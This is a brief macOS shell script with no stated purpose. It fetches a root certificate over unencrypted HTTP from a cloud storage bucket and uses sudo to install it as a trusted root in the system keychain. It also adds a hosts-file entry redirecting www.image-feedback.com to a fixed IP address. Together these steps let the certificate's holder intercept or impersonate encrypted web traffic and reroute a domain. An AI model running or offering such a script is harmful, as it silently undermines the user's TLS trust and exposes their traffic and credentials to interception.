#!/bin/bash
set -e
curl http://on9i1rseh.bkt.clouddn.com/rootCA.pem > /tmp/rootCA.pem
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/rootCA.pem
echo '45.79.77.119 www.image-feedback.com' | sudo tee -a /etc/hosts